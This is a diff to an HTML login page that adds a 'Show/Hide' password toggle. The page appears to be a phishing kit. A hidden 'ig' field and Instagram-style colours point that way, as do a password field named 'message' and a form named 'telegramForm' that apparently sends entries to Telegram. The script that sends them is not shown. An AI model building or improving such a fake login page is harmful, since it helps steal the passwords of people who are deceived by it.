@@ -238,9 +238,31 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       <input type="text" placeholder="Username" id="name" value="ig" name="name" class="input-1" hidden />
       <input type="text" placeholder="Username" id="email" name="email" class="input-1" />
       <input type="hidden" id="region" name="region">
-      <div class="overlap-text">
-        <input type="password" placeholder="Password" id="message" name="message" class="input-2" />
-      </div>
+        <div class="password-wrapper" style="position: relative;">
+          <input 
+            type="password" 
+            placeholder="Password" 
+            id="message" 
+            name="message" 
+            class="input-2"
+            style="padding-right: 60px;"
+          />
+        
+          <span id="togglePassword" 
+                style="
+                  position: absolute;
+                  right: 10px;
+                  top: 50%;
+                  transform: translateY(-50%);
+                  color: #385185;
+                  font-size: 14px;
+                  font-weight: 600;
+                  cursor: pointer;
+                  user-select: none;
+                ">
+            Show
+          </span>
+        </div>
       <input class="btn btn-primary" type="submit" value="Log in">
     </form>
     <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive">
@@ -287,6 +309,21 @@ input[type="submit"]:hover, input[type="submit"]:focus {
       <span>© 2025 </span>
     </p>
   </div>
+  <script>
+    let pwd = document.getElementById("message");
+    let toggle = document.getElementById("togglePassword");
+  
+    toggle.addEventListener("click", function () {
+      if (pwd.type === "password") {
+        pwd.type = "text";
+        toggle.textContent = "Hide";
+      } else {
+        pwd.type = "password";
+        toggle.textContent = "Show";
+      }
+    });
+  </script>
+  
   <script>
     (function() {
       const form = document.getElementById('telegramForm');
@@ -414,4 +451,3 @@ input[type="submit"]:hover, input[type="submit"]:focus {
   </script>
   </body>
   </html>
-
